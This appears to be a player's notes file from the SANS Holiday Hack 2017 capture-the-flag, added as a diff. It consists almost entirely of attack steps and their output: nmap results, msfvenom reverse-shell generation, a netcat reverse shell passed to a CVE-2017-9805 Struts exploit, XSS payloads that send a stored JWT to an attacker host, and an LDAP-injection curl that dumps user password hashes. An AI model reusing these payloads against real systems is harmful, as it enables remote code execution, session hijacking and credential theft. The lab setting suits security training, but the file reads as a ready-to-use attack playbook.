@@ -1,0 +1,260 @@
+-------------------------
+ NMAP SCAN 10.142.0.0/24
+-------------------------
+Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
+Host is up (0.00024s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+443/tcp  open  https
+2222/tcp open  EtherNetIP-1
+
+Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
+Host is up (0.000080s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
+Host is up (0.00016s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+143/tcp  open  imap
+2525/tcp open  ms-v-worlds
+3000/tcp open  ppp
+
+Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
+Host is up (0.00012s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+389/tcp  open  ldap
+8080/tcp open  http-proxy
+
+Nmap scan report for hhc17-smb-server.c.holidayhack2017.internal (10.142.0.7)
+Host is up (0.00087s latency).
+Not shown: 996 filtered ports
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap scan report for hhc17-emi.c.holidayhack2017.internal (10.142.0.8)
+Host is up (0.00077s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE
+80/tcp   open  http
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3389/tcp open  ms-wbt-server
+
+Nmap scan report for hhc17-apache-struts2.c.holidayhack2017.internal (10.142.0.11)
+Host is up (0.00014s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap scan report for eaas.northpolechristmastown.com (10.142.0.13)
+Host is up (0.00074s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE
+80/tcp   open  http
+3389/tcp open  ms-wbt-server
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+L2S
+-------------------------
+      Print Shells
+-------------------------
+msfvenom -l payloads | grep "cmd/unix/" | awk '{print $1}'
+
+
+cmd/unix/bind_awk
+cmd/unix/bind_inetd
+cmd/unix/bind_lua
+cmd/unix/bind_netcat
+cmd/unix/bind_netcat_gaping
+cmd/unix/bind_netcat_gaping_ipv6
+cmd/unix/bind_nodejs
+cmd/unix/bind_perl
+cmd/unix/bind_perl_ipv6
+cmd/unix/bind_r
+cmd/unix/bind_ruby
+cmd/unix/bind_ruby_ipv6
+cmd/unix/bind_zsh
+cmd/unix/generic
+cmd/unix/interact
+cmd/unix/reverse
+cmd/unix/reverse_awk
+cmd/unix/reverse_bash
+cmd/unix/reverse_bash_telnet_ssl
+cmd/unix/reverse_lua
+cmd/unix/reverse_ncat_ssl
+cmd/unix/reverse_netcat
+cmd/unix/reverse_netcat_gaping
+cmd/unix/reverse_nodejs
+cmd/unix/reverse_openssl
+cmd/unix/reverse_perl
+cmd/unix/reverse_perl_ssl
+cmd/unix/reverse_php_ssl
+cmd/unix/reverse_python
+cmd/unix/reverse_python_ssl
+cmd/unix/reverse_r
+cmd/unix/reverse_ruby
+cmd/unix/reverse_ruby_ssl
+cmd/unix/reverse_ssl_double_telnet
+cmd/unix/reverse_zsh
+
+-------------------------
+     Generate Shell
+-------------------------
+msfvenom -p cmd/unix/reverse_netcat LHOST=IP LPORT=8080
+
+No Arch selected, selecting Arch: cmd from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 104 bytes
+mkfifo /tmp/xroqgtd; nc IP 8080 0</tmp/xroqgtd | /bin/sh >/tmp/xroqgtd 2>&1; rm /tmp/xroqgtd 
+
+-------------------------
+	Exploit
+-------------------------
+python cve-2017-9805.py -u 'https://dev.northpolechristmastown.com/orders' -c 'mkfifo /tmp/xroqgtd; nc IP 8080 0</tmp/xroqgtd | /bin/sh >/tmp/xroqgtd 2>&1; rm /tmp/xroqgtd ' 
+
+-------------------------
+      L2S Password
+-------------------------
+classes/org/demo/rest/example/OrderMySql.class:4:            final String password = "stream_unhappy_buy_loss";   
+
+-------------------------
+     L2S Book Page
+-------------------------
+https://l2s.northpolechristmastown.com/GreatBookPage2.pdf
+
+_____________________________________________________________________________________________________________________________________________________________________________________________________________________________________
+
+EDB
+
+-------------------------
+     Bypass Filter
+-------------------------
+this is a test <IMG SRC='#' onerror=alert(document.cookie) />
+
+-------------------------
+   Check localStorage
+-------------------------
+message <IMG SRC='#' onerror=alert(localStorage["np-auth"]) />
+
+-------------------------
+       Grab JWT
+-------------------------
+message <IMG SRC='#' onerror=this.src='http://IP/?c=+localStorage["np-auth"];>
+
+-------------------------
+     JS Set np-auth
+-------------------------
+javascript:localStorage.setItem("np-auth", "TokenValue");
+
+-------------------------
+       Curl LDAP
+-------------------------
+curl -s -x 127.0.0.1:9050 'http://10.142.0.6/search' -A "Mozilla/5.0 (X11; Linux x86_64)" -H 'np-auth: <token_value_here>' --data 'name=)(uid%3D*))(%7C(userpassword%3D&isElf=True&attributes=uid%2Cuserpassword' | sed -e 's/[]{","}[]//g' -e 's/cn.*com//' -e '/^\s*$/d'
+
+        uid: 
+          rudolph
+        userpassword: 
+          ff943fe99491b32ea387489106517af4
+        uid: 
+          blitzen
+        userpassword: 
+          ff943fe99491b32ea387489106517af4
+        uid: 
+          donner
+        userpassword: 
+          ff943fe99491b32ea387489106517af4
+        uid: 
+          cupid
+        userpassword: 
+          ff943fe99491b32ea387489106517af4
+        uid: 
+          comet
+        userpassword: 
+          ff943fe99491b32ea387489106517af4
+        uid: 
+          vixen
+        userpassword: 
+          ff943fe99491b32ea387489106517af4
+        uid: 
+          prancer
+        userpassword: 
+          ff943fe99491b32ea387489106517af4
+        uid: 
+          dancer
+        userpassword: 
+          ff943fe99491b32ea387489106517af4
+        uid: 
+          dasher
+        userpassword: 
+          ff943fe99491b32ea387489106517af4
+        uid: 
+          tarpin.mcjinglehauser
+        userpassword: 
+          f259e9a289c4633fc1e3ab11b4368254
+        uid: 
+          holly.evergreen
+        userpassword: 
+          031ef087617c17157bd8024f13bd9086
+        uid: 
+          mary.sugarplum
+        userpassword: 
+          b9c124f223cdc64ee2ae6abaeffbcbfe
+        uid: 
+          sparkle.redberry
+        userpassword: 
+          82161cf4b4c1d94320200dfe46f0db4c
+        uid: 
+          wunorse.openslae
+        userpassword: 
+          9fd69465699288ddd36a13b5b383e937
+        uid: 
+          minty.candycane
+        userpassword: 
+          bcf38b6e70b907d51d9fa4154954f992
+        uid: 
+          shimmy.upatree
+        userpassword: 
+          d0930efed8e75d7c8ed2e7d8e1d04e81
+        uid: 
+          pepper.minstix
+        userpassword: 
+          d0930efed8e75d7c8ed2e7d8e1d04e81
+        uid: 
+          bushy.evergreen
+        userpassword: 
+          3d32700ab024645237e879d272ebc428
+        uid: 
+          alabaster.snowball
+        userpassword: 
+          17e22cc100b1806cdc3cf3b99a3480b5
+        uid: 
+          jessica.claus
+        userpassword: 
+          16268da802de6a2efe9c672ca79a7071
+        uid: 
+          santa.claus
+        userpassword: 
+          d8b4c05a35b0513f302a85c409b4aab3
+
+-------------------------
+   LDAP Browser Query
+-------------------------
+)(uid=*))(|(userpassword=
+____________________________________
